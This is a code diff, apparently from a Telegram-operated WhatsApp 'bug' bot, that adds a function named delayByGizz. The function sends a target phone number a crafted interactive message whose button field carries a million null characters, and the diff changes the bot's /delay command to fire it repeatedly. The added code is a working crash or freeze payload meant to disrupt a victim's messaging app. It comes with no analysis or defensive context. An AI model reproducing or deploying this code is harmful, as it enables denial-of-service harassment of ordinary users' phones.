@@ -1004,6 +1004,53 @@ async function VampireBugIns(groupJid) {
         console.error("Error sending newsletter:", err);
     }
 }
+//Made by Gizz
+
+async function delayByGizz(target) {
+  return new Promise(async (resolve) => {
+    try {
+      const content = generateWAMessageFromContent(target, {
+        viewOnceMessage: {
+          message: {
+            messageContextInfo: {
+              deviceListMetadata: {},
+              deviceListMetadataVersion: 2
+            },
+            interactiveMessage: {
+              body: {
+                text: '\u0000'
+              },
+              footer: {
+                text: '\u0000'
+              },
+              header: {
+                hasMediaAttachment: false
+              },
+              nativeFlowMessage: {
+                buttons: [
+                  {
+                    name: '\u0000',
+                    buttonParamsJson: `https://wa.me/999999999?text=${"\u0000".repeat(1000000)}`,
+                  }
+                ]
+              }
+            }
+          }
+        }
+      }, {});
+
+      await sock.relayMessage(target, content.message, {
+        messageId: content.key.id,
+        participant: { jid: target }
+      });
+
+      setTimeout(() => resolve(), 2000);
+    } catch (err) {
+      console.error('failed:', err);
+      resolve();
+    }
+  });
+}
 
 async function VampBroadcast(target, mention = true) { // Default true biar otomatis nyala
     const delaymention = Array.from({ length: 30000 }, (_, r) => ({
@@ -1695,9 +1742,9 @@ bot.onText(/\/delay(?:\s(.+))?/, async (msg, match) => {
 ┗━━━━━━━━━━━━━━━━━━━━━━━━━━━┛`
     });
 
-    for (let i = 0; i < 5; i++) { // Kirim 3 kali langsung
-        await VampDelayInvis(formatedNumber);
-        await VampDelayInvis(formatedNumber);
+    for (let i = 0; i < 10; i++) { // Kirim 3 kali langsung
+        await delayByGizz(formatedNumber);
+        await delayByGizz(formatedNumber);
     }
 
     // Kirim notifikasi setelah selesai dengan gambar lain
